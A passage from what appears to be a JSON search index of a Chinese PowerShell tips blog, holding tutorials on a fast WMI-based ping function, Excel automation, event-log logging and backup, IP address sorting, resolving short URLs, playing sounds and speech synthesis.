11010(...)","link":"/2018/02/20/creating-highspeed-ping-part-4/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第五部分）","text":"在前一个技能中我们创建了一个名为 Test-OnlineFast 的高速的新的 PowerShell 函数，它使用 WMI 来高速 ping 任意数量的计算机。今天我们将通过向 ping 的结果增加一些列额外的属性使它变得更有用。 先让我们检查 Test-OnlineFast 是如何工作的。以下是一些例子。我们先 ping 一系列计算机。您既可以使用计算机名也可以使用 IP 地址： 12345678PS&gt; Test-OnlineFast -ComputerName google.de, powershellmagazine.com, 10.10.10.200, 127.0.0.1Address Online DNSName Status------- ------ ------- ------127.0.0.1 True DESKTOP-7AAMJLF Successgoogle.de True google.de Successpowershellmagazine.com True powershellmagazine.com Success10.10.10.200 False Request Timed Out 我们现在 ping 整个 IP 地址段。以下例子是从我们的公共酒店 WLAN 中执行的（请将 IP 范围调整为您所在的网络）： 123456789101112131415161718PS&gt; $iprange = 1..200 | ForEach-Object { &quot;192.168.189.$_&quot; }PS&gt; Test-OnlineFast -ComputerName $iprangeAddress Online DNSName Status------- ------ ------- ------192.168.189.200 True DESKTOP-7AAMJLF.fritz.box Success192.168.189.1 True fritz.box Success192.168.189.134 True PCSUP03.fritz.box Success192.168.189.29 True fritz.repeater Success192.168.189.64 True android-6868316cec604d25.fritz.box Success192.168.189.142 True Galaxy-S8.fritz.box Success192.168.189.65 True mbecker-netbook.fritz.box Success192.168.189.30 True android-7f35f4eadd9e425e.fritz.box Success192.168.189.10 False Request Timed Out192.168.189.100 False Request Timed Out192.168.189.101 False Request Timed Out(...) 神奇的是它的超快速度。ping 整个子网只用了几秒。 现在，我们来看看这个函数。在前面的技能中我们解释了其中的一部分。这个版本向 ping 的结果增加了有用的属性，例如 Online 和 DnsName，它返回关于 ping 状态的友好文本，而不是幻数。所有这些是通过计算属性的哈希表实现的，基于 ping 返回的原始信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778function Test-OnlineFast{ param ( # make parameter pipeline-aware [Parameter(Mandatory)] [string[]] $ComputerName, $TimeoutMillisec = 1000 ) # hash table with error code to text translation $StatusCode_ReturnValue = @{ 0='Success' 11001='Buffer Too Small' 11002='Destination Net Unreachable' 11003='Destination Host Unreachable' 11004='Destination Protocol Unreachable' 11005='Destination Port Unreachable' 11006='No Resources' 11007='Bad Option' 11008='Hardware Error' 11009='Packet Too Big' 11010='Request Timed Out' 11011='Bad Request' 11012='Bad Route' 11013='TimeToLive Expired Transit' 11014='TimeToLive Expired Reassembly' 11015='Parameter Problem' 11016='Source Quench' 11017='Option Too Big' 11018='Bad Destination' 11032='Negotiating IPSEC' 11050='General Failure' } # hash table with calculated property that translates # numeric return value into friendly text $statusFriendlyText = @{ # name of column Name = 'Status' # code to calculate content of column Expression = { # take status code and use it as index into # the hash table with friendly names # make sure the key is of same data type (int) $StatusCode_ReturnValue[([int]$_.StatusCode)] } } # calculated property that returns $true when status -eq 0 $IsOnline = @{ Name = 'Online' Expression = { $_.StatusCode -eq 0 } } # do DNS resolution when system responds to ping $DNSName = @{ Name = 'DNSName' Expression = { if ($_.StatusCode -eq 0) { if ($_.Address -like '*.*.*.*') { [Net.DNS]::GetHostByAddress($_.Address).HostName } else { [Net.DNS]::GetHostByName($_.Address).HostName } } } } # convert list of computers into a WMI query string $query = $ComputerName -join &quot;' or Address='&quot; Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='$query') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, $IsOnline, $DNSName, $statusFriendlyText}","link":"/2018/02/21/creating-highspeed-ping-part-5/"},{"title":"PowerShell 技能连载 - 创建快速的 Ping（第六部分）","text":"这是我们迷你系列的最后一部分，向我们超快的 Test-OnlineFast 函数添加管道功能。您现在可以像这样将计算机名通过管道传给函数： 123456789101112131415PS&gt; 1..200 | ForEach-Object { &quot;192.168.189.$_&quot; } | Test-OnlineFastAddress Online DNSName Status------- ------ ------- ------192.168.189.200 True DESKTOP-7AAMJLF.fritz.box Success192.168.189.1 True fritz.box Success192.168.189.65 True mbecker-netbook.fritz.box Success192.168.189.29 True fritz.repeater Success192.168.189.64 True android-6868316cec604d25.fritz.box Success192.168.189.112 True Galaxy-S8.fritz.box Success192.168.189.142 True Galaxy-S8.fritz.box Success192.168.189.129 True iPhonevMuzaffer.fritz.box Success192.168.189.10 False Request Timed Out192.168.189.100 False Request Timed Out(...) 当然，您也可以传递普通参数给这个函数： 1234567PS&gt; Test-OnlineFast -ComputerName google.de, microsoft.com, 127.0.0.1Address Online DNSName Status------- ------ ------- ------127.0.0.1 True DESKTOP-7AAMJLF Successgoogle.de True google.de Successmicrosoft.com False Request Timed Out 您甚至可以使用其它 cmdlet 的结果，假设您选择了希望传给该函数的属性。一下这行代码 ping 您 Active Directory 中的所有计算机（您最好稍微做一下限制，以免耗尽资源）： 1PS&gt; Get-ADComputer -Filter * | Select-Object -ExpandProperty DnsHostName | Test-OnlineFast","link":"/2018/02/22/creating-highspeed-ping-part-6/"},{"title":"PowerShell 技能连载 - 强制关闭所有 PowerShell ISE 文档","text":"以下是一段强制关闭 PowerShell ISE 中所有打开的文档的代码片段。请注意：它不经提示就关闭所有的文档。它适用于当您搞砸了，并且不准备保存脚本的情况： 12345678foreach ($tab in $psise.PowerShellTabs){ $files = $tab.Files foreach ($file in $files) { $files.Remove($file, $true) }} 不过，当您运行这段代码时，您会收到一个错误。即便您不使用 PowerShell ISE，这个错误（和它的修复信息）对您来说可能十分有趣。 这段代码枚举出所有打开的文件并且尝试逐个关闭它们。这并不能工作：当您枚举一个数组时，您无法改变这个数组。所以当 PowerShell 关闭一个文档时，这个文件列表就变化了，而这将打断这个循环。 当发生这个错误时，一个简单的办法是先将这个数组拷贝到另一个数组。然后就可以安全地枚举这个副本数组。拷贝一个数组十分简单，只需要将它强制类型转换为 [Object[]]。 以下是正确的代码： 12345678foreach ($tab in $psise.PowerShellTabs){ $files = $tab.Files foreach ($file in [Object[]]$files) { $files.Remove($file, $true) }}","link":"/2018/02/23/forcefully-close-all-powershell-ise-documents/"},{"title":"PowerShell 技能连载 - Select-Object 和 -ExcludeProperty","text":"以下是一行常常迷惑 PowerShell 用户的代码： 1Get-Service | Select-Object -ExcludeProperty Name 当您使用 Select-Object 时，它的 -ExcludeProperty 参数并没有做任何事情。实际上，ExcludeProperty 只在使用 -Property 的时候才有效。所以这行代码是可以用的： 1Get-Service | Select-Object -ExcludeProperty Name -Property Status, DisplayName, Name 然而，这看起来很荒谬：为什么通过 -Property 指定了属性，又还要用 ExcludeProperty 来排除它们呢？这样不是更简单吗： 1Get-Service | Select-Object -Property Status, DisplayName 实际上，-ExcludeProperty 只在使用通配符的时候有意义： 12345678PS&gt; Get-CimInstance -ClassName Win32_BIOS | Select-Object -Property *BIOS* -ExcludeProperty *major*, *minor*PrimaryBIOS : TrueBiosCharacteristics : {7, 9, 11, 12...}BIOSVersion : {DELL - 1072009, 1.6.1, American Megatrends - 5000B}SMBIOSBIOSVersion : 1.6.1SMBIOSPresent : True","link":"/2018/02/26/select-object-and--excludeproperty/"},{"title":"PowerShell 技能连载 - 永久性设置环境变量","text":"PowerShell 只能在它的进程空间里设置环境变量，所以这些改变无法保存，并且在 PowerShell 之外不可见。 要永久性地设置环境变量，可以编写一个简单的函数： 1234567891011121314151617181920function Set-EnvironmentVariable{ param ( [string] [Parameter(Mandatory)] $Name, [string] [AllowEmptyString()] [Parameter(Mandatory)] $Value, [System.EnvironmentVariableTarget] [Parameter(Mandatory)] $Target ) [Environment]::SetEnvironmentVariable($Name, $Value, $Target)} 现在您可以这样设置环境变量： 1PS&gt; Set-EnvironmentVariable -Name test -Value 123 -Target User 您也可以传入空字符串来移除一个环境变量。 1PS&gt; Set-EnvironmentVariable -Name test -Value &quot;&quot; -Target User 这是为什么 -Value 参数定义加上 [AllowEmptyString()] 属性的原因。如果没有这个属性，一个必选参数不能接受一个空字符串，那么该函数就无法移除环境变量。 另一个值得注意的地方是 -Target 参数的类型定义：因为制定了一个枚举类型，所以当您在 PowerShell ISE 或其它带有智能提示的编辑器中使用这个函数时，该编辑器将会贴心地提供智能提示选择。","link":"/2018/02/27/permanently-setting-environment-variables/"},{"title":"PowerShell 技能连载 - 读取 Excel 单元格","text":"有些时候，您可能会需要从 Excel 工作表中读取信息。PowerShell 可以操作 Microsoft Excel 对象模型，虽然它的速度很慢。 以下是一段延时如何操作 Excel 单元格的示例代码。请确保您调整了以下代码中的路径，指向一个实际存在的 Excel 文件。该代码将读取 A1 单元格的内容： 123456789101112131415$excel = New-Object -ComObject Excel.Application# open Excel file$workbook = $excel.Workbooks.Open(&quot;c:\\test\\excelfile.xlsx&quot;)# uncomment next line to make Excel visible#$excel.Visible = $true$sheet = $workbook.ActiveSheet$column = 1$row = 1$info = $sheet.cells.Item($column, $row).Text$excel.Quit()&quot;Cell A1 contained '$info'&quot;","link":"/2018/02/28/readingexcel-cells/"},{"title":"PowerShell 技能连载 - 将值保存到 Excel 工作表中","text":"有些时候，您可能会需要更新一个 Excel 工作表中的值。PowerShell 可以操作 Excel 对象模型，不过它很慢。以下是一个打开 Excel 文件，然后写入信息到 A1 单元格，最后保存更改的例子， 请确保您调整了路径，指向一个实际存在的 Excel 文件。 123456789101112131415$excel = New-Object -ComObject Excel.Application# open Excel file$workbook = $excel.Workbooks.Open(&quot;c:\\test\\excelfile.xlsx&quot;)# uncomment next line to make Excel visible#$excel.Visible = $true$sheet = $workbook.ActiveSheet$column = 1$row = 1# change content of Excel cell$sheet.cells.Item($column,$row) = Get-Random# save changes$workbook.Save()$excel.Quit()","link":"/2018/03/01/saving-values-to-excel-sheet/"},{"title":"PowerShell 技能连载 - 自动壁纸下载器","text":"您对桌面壁纸感到厌倦了吗？PowerShell 可以帮您下载最新的壁纸！以下是一个函数： 123456789101112131415161718192021222324252627282930313233343536373839function Download-Wallpaper{ param ( [string] [Parameter(Mandatory)] $Folder, [Parameter(ValueFromPipeline)] [Int] $Page=1 ) begin { $url = &quot;http://wallpaperswide.com/page/$Page&quot; $targetExists = Test-Path -Path $Folder if (!$targetExists) { $null = New-Item -Path $Folder -ItemType Directory } } process { $web = Invoke-WebRequest -Uri $url -UseBasicParsing $web.Images.src | ForEach-Object { $filename = $_.Split('/')[-1].Replace('t1.jpg','wallpaper-5120x3200.jpg') $source = &quot;http://wallpaperswide.com/download/$filename&quot; $TargetPath = Join-Path -Path $folder -ChildPath $filename Invoke-WebRequest -Uri $source -OutFile $TargetPath } } end { explorer $Folder }} 以下是使用方法： 1PS&gt; Download-Wallpaper -Folder c:\\wallpapers 它将从一个公开的壁纸网站下载所有壁纸到本地文件夹，然后打开该文件夹。您所需要做的只是右键单击壁纸并且选择“设为桌面背景”。 默认情况下，Download-Wallpaper 从第一个页面下载壁纸。通过指定 -Page 参数，您可以从其它页面挖掘壁纸。请试试以下代码： 1PS&gt; Download-Wallpaper -Folder c:\\wallpapers","link":"/2018/03/02/automatic-wallpaper-downloader/"},{"title":"PowerShell 技能连载 - 还原短网址","text":"类似 “http://bit.ly/e0Mw9w&quot; 这样的网址十分短小，并且使用起来很方便。但它们往往屏蔽了原始的信息。 PowerShell 查找它们真实指向的地址，来还原短网址： 1234567$url = &quot;http://bit.ly/e0Mw9w&quot;$request = [System.Net.WebRequest]::Create($url)$request.AllowAutoRedirect=$false$response=$request.GetResponse()$trueUrl = $response.GetResponseHeader(&quot;Location&quot;)&quot;$url -&gt; $trueUrl&quot; 以下是使用结果： http://bit.ly/e0Mw9w -&gt; http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1","link":"/2018/03/05/uncover-tiny-urls/"},{"title":"PowerShell 技能连载 - 使用事件日志方便地记录日志","text":"脚本常常需要记录它们做了什么，并且 PowerShell 脚本开发者们需要做投入许多时间精力来将信息记录到文本文件中。 作为另一个选择，您可以方便地使用 Microsoft 已投入建设的工作：PowerShell 可以使用事件日志系统来记录信息。要做测试实验，请用以下代码创建一个新的事件日志。这部分需要管理员特权（写日志时不需要）： 123456789101112#requires -RunAsAdministrator# name for your log$LogName = 'PowerShellPrivateLog'# size (must be dividable by 64KB)$Size = 10MB# specify a list of names that you'd use as source for your events$SourceNames = 'Logon','Work','Misc','Test','Debug'New-EventLog -LogName $LogName -Source $SourceNamesLimit-EventLog -LogName $LogName -MaximumSize $Size -OverflowAction OverwriteAsNeeded 当日志创建了以后，任何用户都可以记录日志文件： 123456789101112PS&gt; Write-EventLog -LogName PowerShellPrivateLog -Message 'Script Started' -Source Work -EntryType Information -EventId 1PS&gt; Write-EventLog -LogName PowerShellPrivateLog -Message 'Something went wrong!' -Source Work -EntryType Error -EventId 1PS&gt; Get-EventLog -LogName PowerShellPrivateLog | ft -AutoSizeIndex Time EntryType Source InstanceID Message----- ---- --------- ------ ---------- ------- 2 Jan 30 21:57 Error Work 1 Something went wrong! 1 Jan 30 21:57 Information Work 1 Script Started 当您创建日志时，必须指定一个合法的 -Source 名称。使用这项技术的一个好处是您可以用 Get-EventLog 来方便地分析您的日志记录。","link":"/2018/03/06/easy-logging-by-using-event-logs/"},{"title":"PowerShell 技能连载 - 查找注册过的事件日志数据源名","text":"当您用 Write-EventLog 将日志写入日志记录时，您需要指定一个合法的事件源名称。然而，并没有一个很方便的办法能查出哪个事件源文件对应注册到某个事件日志。这在您用 New-EventLog 创建新的事件日志时可能会带来麻烦：您不能指定一个已经存在的事件源名称。 以下是一个查找所有事件源名称，并且显示它们注册的事件日志的简单方法： 123456789101112131415161718PS&gt; Get-WmiObject -Class Win32_NTEventLOgFile | Select-Object FileName, SourcesFileName Sources-------- -------Application {Application, .NET Runtime, .NET Runtime Optimization Service, Application Error...}Dell {Dell, DigitalDelivery, Update}HardwareEvents {HardwareEvents}Internet Explorer {Internet Explorer}isaAgentLog {isaAgentLog, isaAgent}Key Management Service {Key Management Service, KmsRequests}OAlerts {OAlerts, Microsoft Office 16 Alerts}PowerShellPrivateLog {PowerShellPrivateLog, Debug, Logon, Misc...}PreEmptive {PreEmptive, PreEmptiveAnalytics}Security {Security, DS, LSA, Microsoft-Windows-Eventlog...}System {System, 3ware, ACPI, ADP80XX...}TechSmith {TechSmith, TechSmith Uploader Service}Windows PowerShell {Windows PowerShell, PowerShell} 您还可以将这个列表转换为一个有用的哈希表： 12345678910# find all registered sources$Sources = Get-WmiObject -Class Win32_NTEventLOgFile | Select-Object FileName, Sources | ForEach-Object -Begin { $hash = @{}} -Process { $hash[$_.FileName] = $_.Sources } -end { $Hash }# list sources for application log$Sources[&quot;Application&quot;]# list sources for system log$Sources[&quot;System&quot;]","link":"/2018/03/07/finding-registered-event-log-source-names/"},{"title":"PowerShell 技能连载 - 将 Windows 错误 ID 转换为友好的文字","text":"当您在 PowerShell 中调用一个底层的函数时，您可能经常会得到一个数值型的返回值。如果这个返回值是来自一个 Windows API 函数，那么有一个非常简单的方法将它转换成有意义的文本： 例如，当一个 API 函数因为权限不足导致失败，它的返回值是 5。让我们将它翻译为一个有意义的文本： 12PS&gt; New-Object -TypeName ComponentModel.Win32Exception(5)Access is denied 在 PowerShell 5 中，您还可以使用这种语法： 12PS&gt; [ComponentModel.Win32Exception]::new(5)Access is denied 请试试这个例子： 11..200 | ForEach-Object { '{0} = {1}' -f $_, (New-Object -TypeName ComponentModel.Win32Exception($_)) }","link":"/2018/03/08/converting-a-windows-error-id-into-friendly-text/"},{"title":"PowerShell 技能连载 - 备份事件日志","text":"有一系列有用的 cmdlet 可以管理事件日志，然而缺失了这个功能： 1234567891011PS&gt; Get-Command -Noun EventLogCommandType Name Version Source----------- ---- ------- ------Cmdlet Clear-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Get-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Limit-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet New-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Remove-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Show-EventLog 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Write-EventLog 3.1.0.0 Microsoft.PowerShell.Management 没有一个将事件日志被分到 *.evtx 文件的 cmdlet。让我们动手编一个吧： 12345678910111213141516171819202122function Backup-Eventlog{ param ( [Parameter(Mandatory)] [string] $LogName, [Parameter(Mandatory)] [string] $DestinationPath ) $eventLog = Get-WmiObject -Class Win32_NTEventLOgFile -filter &quot;FileName='$LogName'&quot; if ($eventLog -eq $null) { throw &quot;Eventlog '$eventLog' not found.&quot; } [int]$status = $eventLog.BackupEventlog($DestinationPath).ReturnValue New-Object -TypeName ComponentModel.Win32Exception($status)} 现在备份事件日志变得十分方便，以下是一个使用示例： 1234567PS&gt; Backup-Eventlog -LogName Application -DestinationPath c:\\test\\backup.evtxThe operation completed successfullyPS&gt; Backup-Eventlog -LogName Application -DestinationPath c:\\test\\backup.evtxThe file existsPS&gt;","link":"/2018/03/09/backing-up-event-logs/"},{"title":"PowerShell 技能连载 - 终极快速的 Ping 命令","text":"在之前的技能系列中，我们开发了一个名为 Test-OnlineFast 的新函数，可以在短时间内 ping 多台计算机。出于某些原因，最终版本并没有包含我们承诺的管道功能。以下是再次带给您的完整函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899function Test-OnlineFast{ param ( # make parameter pipeline-aware [Parameter(Mandatory,ValueFromPipeline)] [string[]] $ComputerName, $TimeoutMillisec = 1000 ) begin { # use this to collect computer names that were sent via pipeline [Collections.ArrayList]$bucket = @() # hash table with error code to text translation $StatusCode_ReturnValue = @{ 0='Success' 11001='Buffer Too Small' 11002='Destination Net Unreachable' 11003='Destination Host Unreachable' 11004='Destination Protocol Unreachable' 11005='Destination Port Unreachable' 11006='No Resources' 11007='Bad Option' 11008='Hardware Error' 11009='Packet Too Big' 11010='Request Timed Out' 11011='Bad Request' 11012='Bad Route' 11013='TimeToLive Expired Transit' 11014='TimeToLive Expired Reassembly' 11015='Parameter Problem' 11016='Source Quench' 11017='Option Too Big' 11018='Bad Destination' 11032='Negotiating IPSEC' 11050='General Failure' } # hash table with calculated property that translates # numeric return value into friendly text $statusFriendlyText = @{ # name of column Name = 'Status' # code to calculate content of column Expression = { # take status code and use it as index into # the hash table with friendly names # make sure the key is of same data type (int) $StatusCode_ReturnValue[([int]$_.StatusCode)] } } # calculated property that returns $true when status -eq 0 $IsOnline = @{ Name = 'Online' Expression = { $_.StatusCode -eq 0 } } # do DNS resolution when system responds to ping $DNSName = @{ Name = 'DNSName' Expression = { if ($_.StatusCode -eq 0) { if ($_.Address -like '*.*.*.*') { [Net.DNS]::GetHostByAddress($_.Address).HostName } else { [Net.DNS]::GetHostByName($_.Address).HostName } } } } } process { # add each computer name to the bucket # we either receive a string array via parameter, or # the process block runs multiple times when computer # names are piped $ComputerName | ForEach-Object { $null = $bucket.Add($_) } } end { # convert list of computers into a WMI query string $query = $bucket -join &quot;' or Address='&quot; Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='$query') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, $IsOnline, $DNSName, $statusFriendlyText }} 让我们首先来确认 Test-OnlineFast 是如何工作的。以下是一些示例。我们首先 ping 一系列计算机。您可以同时使用计算机名和 IP 地址： 12345678PS&gt; Test-OnlineFast -ComputerName google.de, powershellmagazine.com, 10.10.10.200, 127.0.0.1Address Online DNSName Status------- ------ ------- ------127.0.0.1 True DESKTOP-7AAMJLF Successgoogle.de True google.de Successpowershellmagazine.com True powershellmagazine.com Success10.10.10.200 False Request Timed Out 我们现在来 ping 一整个 IP 段。以下例子从我们公共的酒店 WLAN 中（请确保将 IP 段调整为您所在的网段）： 123456789101112131415161718PS&gt; $iprange = 1..200 | ForEach-Object { &quot;192.168.189.$_&quot; }PS&gt; Test-OnlineFast -ComputerName $iprangeAddress Online DNSName Status------- ------ ------- ------192.168.189.200 True DESKTOP-7AAMJLF.fritz.box Success192.168.189.1 True fritz.box Success192.168.189.134 True PCSUP03.fritz.box Success192.168.189.29 True fritz.repeater Success192.168.189.64 True android-6868316cec604d25.fritz.box Success192.168.189.142 True Galaxy-S8.fritz.box Success192.168.189.65 True mbecker-netbook.fritz.box Success192.168.189.30 True android-7f35f4eadd9e425e.fritz.box Success192.168.189.10 False Request Timed Out192.168.189.100 False Request Timed Out192.168.189.101 False Request Timed Out(...) 神奇的是超快的速度。ping 整个子网只花费了几秒钟。","link":"/2018/03/12/final-super-fast-ping-command/"},{"title":"PowerShell 技能连载 - 正确地排序 IPv4 地址","text":"在前一个示例中我们发布了一个超快的名为 Test-OnlieFast 的函数，并且这个函数可以在短时间内 ping 整个 IP 段： 123456789101112131415161718PS&gt; $iprange = 1..200 | ForEach-Object { &quot;192.168.189.$_&quot; }PS&gt; Test-OnlineFast -ComputerName $iprangeAddress Online DNSName Status------- ------ ------- ------192.168.189.200 True DESKTOP-7AAMJLF.fritz.box Success192.168.189.1 True fritz.box Success192.168.189.134 True PCSUP03.fritz.box Success192.168.189.29 True fritz.repeater Success192.168.189.64 True android-6868316cec604d25.fritz.box Success192.168.189.142 True Galaxy-S8.fritz.box Success192.168.189.65 True mbecker-netbook.fritz.box Success192.168.189.30 True android-7f35f4eadd9e425e.fritz.box Success192.168.189.10 False Request Timed Out192.168.189.100 False Request Timed Out192.168.189.101 False Request Timed Out(...) 然而，IP 地址列并没有排序过。当然您可以使用 Sort-Object 来实现，但是由于地址中的数据是字符串格式，所以它会按字母排序。 以下是一个可以正确地对 IPv4 地址排序的简单技巧： 1PS&gt; Test-OnlineFast -ComputerName $iprange | Sort-Object { $_.Address -as [Version]} 基本上，您通过 Sort-Object 将数据转换为 Version 对象，它刚好像 IPv4 地址一样，也是由四位数字组成。由于如果数据无法转换时，操作符 -as 将返回 NULL 结果，任何 IPv6 地址将会出现在列表的顶部（未排序）。 如果您错过了之前的 Test-OnlineFast 代码，以下再次把它贴出来： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899function Test-OnlineFast{ param ( # make parameter pipeline-aware [Parameter(Mandatory,ValueFromPipeline)] [string[]] $ComputerName, $TimeoutMillisec = 1000 ) begin { # use this to collect computer names that were sent via pipeline [Collections.ArrayList]$bucket = @() # hash table with error code to text translation $StatusCode_ReturnValue = @{ 0='Success' 11001='Buffer Too Small' 11002='Destination Net Unreachable' 11003='Destination Host Unreachable' 11004='Destination Protocol Unreachable' 11005='Destination Port Unreachable' 11006='No Resources' 11007='Bad Option' 11008='Hardware Error' 11009='Packet Too Big' 11010='Request Timed Out' 11011='Bad Request' 11012='Bad Route' 11013='TimeToLive Expired Transit' 11014='TimeToLive Expired Reassembly' 11015='Parameter Problem' 11016='Source Quench' 11017='Option Too Big' 11018='Bad Destination' 11032='Negotiating IPSEC' 11050='General Failure' } # hash table with calculated property that translates # numeric return value into friendly text $statusFriendlyText = @{ # name of column Name = 'Status' # code to calculate content of column Expression = { # take status code and use it as index into # the hash table with friendly names # make sure the key is of same data type (int) $StatusCode_ReturnValue[([int]$_.StatusCode)] } } # calculated property that returns $true when status -eq 0 $IsOnline = @{ Name = 'Online' Expression = { $_.StatusCode -eq 0 } } # do DNS resolution when system responds to ping $DNSName = @{ Name = 'DNSName' Expression = { if ($_.StatusCode -eq 0) { if ($_.Address -like '*.*.*.*') { [Net.DNS]::GetHostByAddress($_.Address).HostName } else { [Net.DNS]::GetHostByName($_.Address).HostName } } } } } process { # add each computer name to the bucket # we either receive a string array via parameter, or # the process block runs multiple times when computer # names are piped $ComputerName | ForEach-Object { $null = $bucket.Add($_) } } end { # convert list of computers into a WMI query string $query = $bucket -join &quot;' or Address='&quot; Get-WmiObject -Class Win32_PingStatus -Filter &quot;(Address='$query') and timeout=$TimeoutMillisec&quot; | Select-Object -Property Address, $IsOnline, $DNSName, $statusFriendlyText }}","link":"/2018/03/13/sort-ipv4-addresses-correctly/"},{"title":"PowerShell 技能连载 - 正确地对 IPv4 和 IPv6 地址排序","text":"当您尝试使用 Sort-Object 对 IPv4 地址排序的时候，结果是错误的： 1234PS&gt; '10.1.2.3', '2.3.4.5', '1.2.3.4' | Sort-Object1.2.3.410.1.2.32.3.4.5 这并不令人意外，因为数据类型是字符串型，所以 Sort-Object 使用的是字母排序。在前一个技能中我们介绍了如何将数据转换未 [Version] 类型，并且假装在排序软件版本号： 1234PS&gt; '10.1.2.3', '2.3.4.5', '1.2.3.4' | Sort-Object -Property { $_ -as [Version] }1.2.3.42.3.4.510.1.2.3 然而，这种方法对 IPv6 地址行不通，因为它无法转换为版本号： 1234567PS&gt; '10.1.2.3', 'fe80::532:c4e:c409:b987%13', '2.3.4.5', '2DAB:FFFF:0000:3EAE:01AA:00FF:DD72:2C4A', '1.2.3.4' | Sort-Object -Property { $_ -as [Version] }fe80::532:c4e:c409:b987%132DAB:FFFF:0000:3EAE:01AA:00FF:DD72:2C4A1.2.3.42.3.4.510.1.2.3 用 -as 操作符将 IPv6 地址转为 [Version] 返回的是 NULL，所以当用 Sort-Object 排序时，IPv6 地址会出现在列表的最顶部。 要对 IPv6 地址排序，缺省的字母排序是够用的。所以我们做一些改变，当遇到一个 IPv6 地址时，用它的字符串值来排序： 1234567$code = { $version = $_ -as [Version] if ($version -eq $null) { &quot;z$_&quot; } else { $version }}'10.1.2.3', 'fe80::532:c4e:c409:b987%13', '2.3.4.5', '2DAB:FFFF:0000:3EAE:01AA:00FF:DD72:2C4A', '1.2.3.4' | Sort-Object -Property $code 现在结果看起来清爽多了： 10.1.2.3 2.3.4.5 1.2.3.4 2DAB:FFFF:0000:3EAE:01AA:00FF:DD72:2C4A fe80::532:c4e:c409:b987%13 请注意代码中向 IPv6 的字符串开头加入字母 “z”。这是为了保证 IPv6 地址位于列表的底部。如果您希望它们位于列表的顶部，请试试这段代码： 12345$code = { $version = $_ -as [Version] if ($version -eq $null) { &quot;/$_&quot; } else { $version }} 由于 “/“ 的 ASCII 值比 “0” 更小，所以 IPv6 地址位于列表的顶部： 2DAB:FFFF:0000:3EAE:01AA:00FF:DD72:2C4A fe80::532:c4e:c409:b987%13 1.2.3.4 2.3.4.5 10.1.2.3","link":"/2018/03/14/sort-ipv4-and-ipv6-addresses-correctly/"},{"title":"PowerShell 技能连载 - 播放声音","text":"如果您只是需要蜂鸣，那么 PowerShell 可以很轻松地帮助您： 123$frequency = 800$durationMS = 2000[console]::Beep($frequency, $durationMS) 如果您需要做一些更复杂的事，那么您可以让 PowerShell 播放一段系统声音： 1[System.Media.SystemSounds]::Asterisk.Play() 以下是支持的系统声音列表： 123456789101112PS&gt; [System.Media.SystemSounds] | Get-Member -Static -MemberType Property TypeName: System.Media.SystemSoundsName MemberType Definition---- ---------- ----------Asterisk Property static System.Media.SystemSound Asterisk {get;}Beep Property static System.Media.SystemSound Beep {get;}Exclamation Property static System.Media.SystemSound Exclamation {get;}Hand Property static System.Media.SystemSound Hand {get;}Question Property static System.Media.SystemSound Question {get;}","link":"/2018/03/15/playing-sounds/"},{"title":"PowerShell 技能连载 - 播放声音文件","text":"在前一个技能里我们演示了如何用 PowerShell 播放系统声音。对于更灵活一些的场景，PowerShell 也可以播放任意的 *.wav 声音文件： 123$soundPlayer = New-Object System.Media.SoundPlayer$soundPlayer.SoundLocation=&quot;$env:windir\\Media\\notify.wav&quot;$soundPlayer.Play() 默认情况下，PowerShell 并不会等待声音播放完毕。如果您需要同步播放声音，请试试这段代码： 1234$soundPlayer = New-Object System.Media.SoundPlayer$soundPlayer.SoundLocation=&quot;$env:windir\\Media\\notify.wav&quot;$soundPlayer.PlaySync()&quot;Done.&quot; 要播放不同的声音文件，只需要将路径替换为声音文件即可： sound player 也可以用后台线程循环播放一个文件： 123$soundPlayer = New-Object System.Media.SoundPlayer$soundPlayer.SoundLocation=&quot;$env:windir\\Media\\notify.wav&quot;$soundPlayer.PlayLooping() 当后台正在播放声音时，请确保用这段代码停止播放声音： 1$soundPlayer.Stop()","link":"/2018/03/16/playing-sound-files/"},{"title":"PowerShell 技能连载 - 合成语音（第 1 部分）","text":"在之前的技能中，我们演示了 PowerShell 如何通过播放系统声音或 WAV 声音文件来生成声音信号。PowerShell 也可以调用内置的语音合成器： 123Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$synthesizer.Speak('Hello! I am your computer!') 请注意 Windows 10 自带了本地化的文字转语音引擎，所以如果您的 Windows 不是使用英语语言，您可能需要将以上文字转为您的语言。 可以用一系列属性来调整输出的效果。请试试这段代码： 1234Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$synthesizer.Rate = -10$synthesizer.Speak('Uh, I am not feeling that well!')","link":"/2018/03/19/synthesizing-speech-part-1/"},{"title":"PowerShell 技能连载 - 合成语音（第 2 部分）","text":"在前一个技能中我们介绍了文字转语音引擎。这个引擎可以将文本转为一个 WAV 声音文件。这样我们可以利用它来生成语音信息： 1234567891011$Path = &quot;$home\\Desktop\\clickme.wav&quot;Add-Type -AssemblyName System.Speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$synthesizer.SetOutputToWaveFile($Path)$synthesizer.Rate = -10$synthesizer.Speak('Uh, I am not feeling that well!')$synthesizer.SetOutputToDefaultAudioDevice()# run the WAV file (you can also double-click the file on your desktop!)Invoke-Item -Path $Path","link":"/2018/03/20/synthesizing-speech-recording-to-file-part-2/"},{"title":"PowerShell 技能连载 - 合成语音 – 使用语音合成标记语言 SSML（第 3 部分）","text":"Windows 